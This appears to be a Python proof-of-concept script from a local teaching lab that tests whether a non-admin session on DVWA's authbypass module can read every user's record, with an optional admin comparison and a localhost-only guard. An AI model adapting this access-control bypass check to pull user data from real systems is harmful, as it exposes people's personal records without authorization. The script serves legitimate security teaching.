#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AUTH-001-F1 read-side check: does a non-admin session list every user?

Local teaching lab only. Endpoint path comes from AUTH-001-B line 28
(xhr.open('GET', 'get_user_data.php', true)) and AUTH-001-A line 33.
Credentials are supplied from a local file and never printed.

Usage:
  python auth001_f1_read.py --base http://127.0.0.1/dvwa --cookie-file low.cookie --security low
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
READ_PATH = "/vulnerabilities/authbypass/get_user_data.php"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_base(raw):
    parts = urllib.parse.urlparse(raw)
    if parts.scheme not in ("http", "https"):
        sys.exit("base must be http(s): %r" % raw)
    if (parts.hostname or "") not in ALLOWED_HOSTS:
        sys.exit("only localhost/127.0.0.1/::1 allowed, got %r" % (parts.hostname,))
    return raw.rstrip("/")


def read_cookie(path):
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        sys.exit("cookie file is empty")
    return value


def get_users(base, cookie, timeout):
    req = urllib.request.Request(
        base + READ_PATH,
        headers={"Accept": "application/json", "Cookie": cookie},
        method="GET",
    )
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        sys.exit("connection/protocol error: %s" % exc)


def as_rows(body):
    try:
        payload = json.loads(body)
    except ValueError:
        return None
    if not isinstance(payload, list):
        return None
    rows = []
    for item in payload:
        if isinstance(item, dict):
            rows.append((item.get("user_id"), item.get("first_name"), item.get("surname")))
    return rows


def show(label, status, body):
    rows = as_rows(body)
    print("[%s] http_status=%s" % (label, status))
    if rows is None:
        print("[%s] body is not a JSON user array: %s" % (label, body[:200]))
        return None
    print("[%s] row_count=%d" % (label, len(rows)))
    for uid, first, surname in rows:
        print("[%s]   user_id=%r first_name=%r surname=%r" % (label, uid, first, surname))
    return rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. http://127.0.0.1/dvwa")
    ap.add_argument("--cookie-file", required=True,
                    help="local file holding the low-privilege Cookie header value")
    ap.add_argument("--admin-cookie-file", default=None,
                    help="optional admin session for the control comparison")
    ap.add_argument("--security", default=None,
                    help="optional value appended as the security cookie")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    base = parse_base(args.base)
    cookie = read_cookie(args.cookie_file)
    if args.security:
        cookie = cookie + "; security=" + args.security

    status, body = get_users(base, cookie, args.timeout)
    low_rows = show("low-priv", status, body)
    if low_rows is None:
        print("RESULT: no user array returned; endpoint unreachable or precondition failed")
        return 2
    if not low_rows:
        print("RESULT: empty user list; check the seeded users table before judging")
        return 2

    print("RESULT: received %d user records from a non-admin session" % len(low_rows))
    print("CHECK: at least one user_id must differ from the acting account id")

    if args.admin_cookie_file:
        admin_cookie = read_cookie(args.admin_cookie_file)
        if args.security:
            admin_cookie = admin_cookie + "; security=" + args.security
        status_a, body_a = get_users(base, admin_cookie, args.timeout)
        admin_rows = show("admin", status_a, body_a)
        if admin_rows is not None:
            same = sorted(map(str, admin_rows)) == sorted(map(str, low_rows))
            print("CONTROL: admin and low-priv row sets identical = %s" % same)
    return 0


if __name__ == "__main__":
    main()
